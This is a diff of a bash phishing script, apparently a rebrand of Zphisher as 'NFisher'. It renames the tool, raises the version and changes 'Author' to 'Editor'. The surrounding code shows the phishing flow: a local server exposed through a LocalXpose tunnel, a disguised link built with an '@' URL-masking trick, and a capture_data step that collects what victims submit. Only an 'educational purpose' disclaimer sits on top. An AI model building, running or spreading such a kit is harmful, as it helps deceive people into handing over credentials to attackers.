@@ -1,6 +1,6 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
+##   NFisher 	: 	Automated Phishing Tool
 ##   Author 	: 	NAVIN SHARMA 
 ##   Version 	: 	2.3.2
 ##   Github 	: 	https://github.com/NavinSha1801/NavinFisher.git
@@ -78,10 +78,8 @@
 ##
 ##      Copyright (C) 2022  GAMENOSHAME (https://github.com/NavinSha1801)
 ##
-
-
-__version__="2.3.2"
-
+##version
+__version__="6.6.1"
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
@@ -174,7 +172,6 @@ banner_small() {
 		                                                                                 ${CYAN} ${__version__}
 	EOF
 }
-
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
@@ -316,14 +313,14 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}NAVIN SHARMA ${RED}[ ${ORANGE}GAMENOSHAME ${RED}]
+		${GREEN} Editor   ${RED}:  ${ORANGE}NAVIN SHARMA ${RED}[ ${ORANGE}GAMENOSHAME ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/NavinSha1801/NavinFisher.git
 		${GREEN} Social   ${RED}:  ${CYAN}Navin Sharma
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
-		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  only ${RED}!${WHITE}${CYAN} Editor will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
@@ -348,7 +345,6 @@ HOST='127.0.0.1'
 #DEFAULT PORT
 PORT='8080' 
 
-#COUSTOM PORT
 cusport() {
 	echo ""
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Coustom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
@@ -501,8 +497,8 @@ start_loclx() {
 
 	{ sleep 12; clear; banner_small; }
 	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Initial URL : ${GREEN}http://$loclx_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASK URL    : ${GREEN}$mask@$loclx_url"
 	capture_data
 }
 
